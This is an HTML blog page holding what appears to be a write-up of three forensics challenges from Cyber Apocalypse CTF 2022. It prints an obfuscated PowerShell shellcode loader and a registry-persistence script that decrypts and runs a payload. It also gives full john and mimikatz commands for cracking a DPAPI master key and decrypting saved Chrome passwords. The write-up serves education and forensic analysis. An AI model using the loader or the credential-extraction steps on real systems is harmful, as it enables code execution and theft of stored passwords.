@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Cyber Apocalypse CTF 2022 | Luhko</title>
+<meta name="keywords" content="">
+<meta name="description" content="Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :
+ Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.
+In the Powershell Operational, we can find this suspicious script (regarding the variables name) :">
+<meta name="author" content="">
+<link rel="canonical" href="https://luhko.github.io/wu/cyber2022/">
+<link crossorigin="anonymous" href="https://luhko.github.io/assets/css/stylesheet.41f2d211c00e636a3c229c52ef2d4299a66891ae66771098993b13bca7972ae6.css" integrity="sha256-QfLSEcAOY2o8IpxS7y1CmaZoka5mdxCYmTsTvKeXKuY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="https://luhko.github.io/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://luhko.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://luhko.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://luhko.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://luhko.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://luhko.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Cyber Apocalypse CTF 2022" />
+<meta property="og:description" content="Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :
+ Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.
+In the Powershell Operational, we can find this suspicious script (regarding the variables name) :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://luhko.github.io/wu/cyber2022/" /><meta property="article:section" content="wu" />
+<meta property="article:published_time" content="2022-05-19T23:44:49&#43;02:00" />
+<meta property="article:modified_time" content="2022-05-19T23:44:49&#43;02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cyber Apocalypse CTF 2022"/>
+<meta name="twitter:description" content="Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :
+ Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.
+In the Powershell Operational, we can find this suspicious script (regarding the variables name) :"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cyber Apocalypse CTF 2022",
+      "item": "https://luhko.github.io/wu/cyber2022/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cyber Apocalypse CTF 2022",
+  "name": "Cyber Apocalypse CTF 2022",
+  "description": "Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :\n Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.\nIn the Powershell Operational, we can find this suspicious script (regarding the variables name) :",
+  "keywords": [
+    
+  ],
+  "articleBody": "Forensics Pupeteer We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :\n Powershell Powershell Operational Powershell Admin (empty)  In the powershell logs, there is nothing really interesting but a suspicious filename special_orders.ps1.\nIn the Powershell Operational, we can find this suspicious script (regarding the variables name) :\n$OleSPrlmhB = @\" [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); \"@ [byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3; [byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1; $tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name \"Win32\" -namespace Win32Functions -passthru; [Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04; [array]::Reverse($stage2); $hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40); $stage3 = $stage1 + $stage2; [System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length); # Unpack Shellcode; for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++) { $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1; } #Unpack Special Orders! for($i=0;$i -lt $stage3.count;$i++){ $stage3[$i] = $stage3[$i] -bxor 0xd1; } $tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0); If we execute it, there is nothing printed and the powershell window is closing. I tried to print $stage3 (and I removed the last line to prevent the window closing), which is giving me the following output :\n$ .\\script.ps1 72 84 66 123 98 51 119 104 52 114 51 95 48 102 95 116 104 51 95 98 48 48 116 53 95 48 102 95 106 117 115 116 49 99 51 46 46 46 125 This looks like a decimal ASCII chain. After decoding it (decimal → ascii), I got the flag !\nGolden Persistence We have a NTUSER.DAT file. This file is used as a hive file (HKEY_CURRENT_USER) in Windows systems. We can navigate in it with Registry Explorer.\nRegarding the challenge description, we know that it is about persistence. Usually, persistence stuff are located in HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nAfter navigating to the key, we can find the following value, which is highly suspicious :\nWe can use this tool to decrypt the payload :\nfunction encr { param( [Byte[]]$data, [Byte[]]$key ) [Byte[]]$buffer = New-Object Byte[] $data.Length $data.CopyTo($buffer, 0) [Byte[]]$s = New-Object Byte[] 256; [Byte[]]$k = New-Object Byte[] 256; for ($i = 0; $i -lt 256; $i++) { $s[$i] = [Byte]$i; $k[$i] = $key[$i % $key.Length]; } $j = 0; for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; } $i = $j = 0; for ($x = 0; $x -lt $buffer.Length; $x++) { $i = ($i + 1) % 256; $j = ($j + $s[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; [int]$t = ($s[$i] + $s[$j]) % 256; $buffer[$x] = $buffer[$x] -bxor $s[$t]; } return $buffer } function HexToBin { param( [Parameter( Position=0, Mandatory=$true, ValueFromPipeline=$true) ] [string]$s) $return = @() for ($i = 0; $i -lt $s.Length ; $i += 2) { $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber) } Write-Output $return } [Byte[]]$key = $enc.GetBytes(\"Q0mmpr4B5rvZi3pS\") $encrypted1 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL $encrypted2 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\BjqAtIen).uLltjjW $encrypted3 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\AppDataLow\\t03A1Stq).uY4S39Da $encrypted4 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\Google\\Nv50zeG).Kb19fyhl $encrypted5 = (Get-ItemProperty -Path HKCU:\\AppEvents\\Jx66ZG0O).jH54NW8C $encrypted = \"$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\" $enc = [System.Text.Encoding]::ASCII [Byte[]]$data = HexToBin $encrypted $DecryptedBytes = encr $data $key $DecryptedString = $enc.GetString($DecryptedBytes) $DecryptedString|iex The things that we need to do are:\n Extract the value of $encrypted1..5 in the registry ; and replace it in the script Replace $enc declaration before $key declaration  Final script :\n... $enc = [System.Text.Encoding]::ASCII [Byte[]]$key = $enc.GetBytes(\"Q0mmpr4B5rvZi3pS\") $encrypted1 = \"F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\" $encrypted2 = \"CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\" $encrypted3 = \"C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\" $encrypted4 = \"D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\" $encrypted5 = \"84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\" $encrypted = \"$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\" [Byte[]]$data = HexToBin $encrypted $DecryptedBytes = encr $data $key $DecryptedString = $enc.GetString($DecryptedBytes) $DecryptedString|iex Then we execute it :\n$ ./script.ps1 ... $flag=\"HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}\" Seized This challenge is about finding ransomware operators credentials in the AppData folder :\nAfter some researches about potential interesting location, I found the Google one. This folder contains data about Google Chrome and 2 particular files are interesting :\n AppData\\Local\\Google\\Chrome\\User Data\\Local State  Contains the key that encrypts the user’s passwords. This key is encrypted with the Master Key from the system, generated from various parameters, including the user’s password.   AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data  This file is a database that contains login information : website, login, password. Passwords may (or not) be encrypted. In our case, there is the login ransomoperator@draeglocker.com and the associated password is encrypted.    Let’s find out if we can find the master key file. It should be located in AppData\\Roaming\\Microsoft\\Protect\\{SID} :\n$Get-ChildItem -Hidden AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3702016591-3723034727-1691771208-1002\\ Répertoire: AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3702016591-3723034727-1691771208-1002 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 22/03/2022 15:06 468 865be7a6-863c-4d73-ac9f-233f8734089d -a-hs- 22/03/2022 15:06 24 Preferred There is a master key file. Since it is encrypted, we need to decrypt it to extract the master key. The first thing to do is to convert the data to a crackable format :\n$ python DPAPImk2john.py -mk 865be7a6-863c-4d73-ac9f-233f8734089d -S S-1-5-21-3702016591-3723034727-1691771208-1002 -c local $DPAPImk$2*1*S-1-5-21-3702016591-3723034727-1691771208-1002*aes256*sha512*8000*a17612a0ebdfc203316e0c18c04729f1*288*7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc Let’s give our hash to john :\nroot@jtr:/hashes# ../jtr/run/john dump --wordlist=rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (DPAPImk, DPAPI masterkey file v1 and v2 [SHA1/MD4 PBKDF2-(SHA1/SHA512)-DPAPI-variant 3DES/AES256 256/256 AVX2 8x]) Cost 1 (iteration count) is 8000 for all loaded hashes Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ransom (?) 1g 0:00:00:05 DONE (2022-05-18 17:17) 0.1692g/s 5457p/s 5457c/s 5457C/s 210392..bheibhie Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Bingo ! We got the password ransom\nNow, we want to decrypt the master key using the holy mimikatz :\nmimikatz # dpapi::masterkey /in:\"AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3702016591-3723034727-1691771208-1002\\865be7a6-863c-4d73-ac9f-233f8734089d\" /sid:S-1-5-21-3702016591-3723034727-1691771208-1002 /password:ransom /protected **MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {865be7a6-863c-4d73-ac9f-233f8734089d} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : a17612a0ebdfc203316e0c18c04729f1 rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 9e4ad8f433383f8543cdc7f97d94cc46 rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 32bafd010af552fd03f566b9e411cc6ef7860c8e33c4feca3cc3c7fe2e87e09bb477111b88a1930650c8c0a10ea1f9314435bca867b3f905127d563009c8f43ed9def056ac533e51f8aa90104d98ad591a156dffe6776c53ffd4df22cd639c83162396244aff646226e14681dddbf749 [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {a2a87803-e77b-44b9-8ca2-01526cb531e4} [masterkey] with password: ransom (protected user) key : 138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630 sha1: a765463192eb14812650e62d6b0150a262d1864e Then we can use the master key to decrypt the password and get the flag !\nmimikatz # dpapi::chrome /in:\"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect /masterkey:138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630  Encrypted Key found in local state file  Encrypted Key seems to be protected by DPAPI * using CryptUnprotectData API * masterkey : 138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630  AES Key is: 46befddb52a607c5e775b7a930b6b6c4f3a35e7c1c30aaa4ce0d2277fbca6c19 URL : https://windowsliveupdater.com/ ( https://windowsliveupdater.com/ ) Username: ransomoperator@draeglocker.com * using BCrypt with AES-256-GCM Password: HTB{Br0ws3rs_C4nt_s4v3_y0u_n0w} Related sources https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\nhttps://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf\nhttps://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++\n",
+  "wordCount" : "1150",
+  "inLanguage": "en",
+  "datePublished": "2022-05-19T23:44:49+02:00",
+  "dateModified": "2022-05-19T23:44:49+02:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://luhko.github.io/wu/cyber2022/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Luhko",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://luhko.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://luhko.github.io/" accesskey="h" title="Luhko (Alt + H)">Luhko</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://luhko.github.io/" title="Home">
+                    <span><br />Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://luhko.github.io/articles" title="Articles">
+                    <span><br />Articles</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://luhko.github.io/wu" title="Write-Up">
+                    <span><br />Write-Up</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Cyber Apocalypse CTF 2022
+    </h1>
+    <div class="post-meta"><span title='2022-05-19 23:44:49 +0200 CEST'>May 19, 2022</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="forensics">Forensics<a hidden class="anchor" aria-hidden="true" href="#forensics">#</a></h1>
+<h2 id="pupeteer">Pupeteer<a hidden class="anchor" aria-hidden="true" href="#pupeteer">#</a></h2>
+<p>We have a bunch of log files. I tried to parse it using EvtxEcmd or Logviewplus but there was too much data. So I tried to focus on Powershell logs :</p>
+<ul>
+<li>Powershell</li>
+<li>Powershell Operational</li>
+<li>Powershell Admin <strong>(empty)</strong></li>
+</ul>
+<p>In the powershell logs, there is nothing really interesting but a suspicious filename <code>special_orders.ps1</code>.</p>
+<p>In the Powershell Operational, we can find this suspicious script (regarding the variables name) :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">$</span>OleSPrlmhB = <span style="color:#e6db74">@&#34;
+</span><span style="color:#e6db74">[DllImport(&#34;</span>kernel32.dll<span style="color:#e6db74">&#34;)]
+</span><span style="color:#e6db74"></span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAlloc(IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
+<span style="color:#a6e22e">[DllImport(&#34;kernel32.dll&#34;)]</span>
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateThread(IntPtr lpThreadAttributes, <span style="color:#66d9ef">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#66d9ef">uint</span> dwCreationFlags, IntPtr lpThreadId);
+<span style="color:#e6db74">&#34;@
+</span><span style="color:#e6db74"></span><span style="color:#a6e22e">
+</span><span style="color:#a6e22e">[byte[]</span>] <span style="color:#960050;background-color:#1e0010">$</span>stage1 = <span style="color:#ae81ff">0</span>x99, <span style="color:#ae81ff">0</span>x85, <span style="color:#ae81ff">0</span>x93, <span style="color:#ae81ff">0</span>xaa, <span style="color:#ae81ff">0</span>xb3, <span style="color:#ae81ff">0</span>xe2, <span style="color:#ae81ff">0</span>xa6, <span style="color:#ae81ff">0</span>xb9, <span style="color:#ae81ff">0</span>xe5, <span style="color:#ae81ff">0</span>xa3, <span style="color:#ae81ff">0</span>xe2, <span style="color:#ae81ff">0</span>x8e, <span style="color:#ae81ff">0</span>xe1, <span style="color:#ae81ff">0</span>xb7, <span style="color:#ae81ff">0</span>x8e, <span style="color:#ae81ff">0</span>xa5, <span style="color:#ae81ff">0</span>xb9, <span style="color:#ae81ff">0</span>xe2, <span style="color:#ae81ff">0</span>x8e, <span style="color:#ae81ff">0</span>xb3;
+<span style="color:#a6e22e">[byte[]</span>] <span style="color:#960050;background-color:#1e0010">$</span>stage2 = <span style="color:#ae81ff">0</span>xac, <span style="color:#ae81ff">0</span>xff, <span style="color:#ae81ff">0</span>xff, <span style="color:#ae81ff">0</span>xff, <span style="color:#ae81ff">0</span>xe2, <span style="color:#ae81ff">0</span>xb2, <span style="color:#ae81ff">0</span>xe0, <span style="color:#ae81ff">0</span>xa5, <span style="color:#ae81ff">0</span>xa2, <span style="color:#ae81ff">0</span>xa4, <span style="color:#ae81ff">0</span>xbb, <span style="color:#ae81ff">0</span>x8e, <span style="color:#ae81ff">0</span>xb7, <span style="color:#ae81ff">0</span>xe1, <span style="color:#ae81ff">0</span>x8e, <span style="color:#ae81ff">0</span>xe4, <span style="color:#ae81ff">0</span>xa5, <span style="color:#ae81ff">0</span>xe1, <span style="color:#ae81ff">0</span>xe1;
+
+<span style="color:#960050;background-color:#1e0010">$</span>tNZvQCljVk = Add-Type -memberDefinition <span style="color:#960050;background-color:#1e0010">$</span>OleSPrlmhB -Name <span style="color:#e6db74">&#34;Win32&#34;</span> -<span style="color:#66d9ef">namespace</span> Win32Functions -passthru;
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">[Byte[]</span>] <span style="color:#960050;background-color:#1e0010">$</span>HVOASfFuNSxRXR = <span style="color:#ae81ff">0</span>x2d,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x35,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x39,<span style="color:#ae81ff">0</span>x1d,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x03,<span style="color:#ae81ff">0</span>xb4,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xb1,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x87,<span 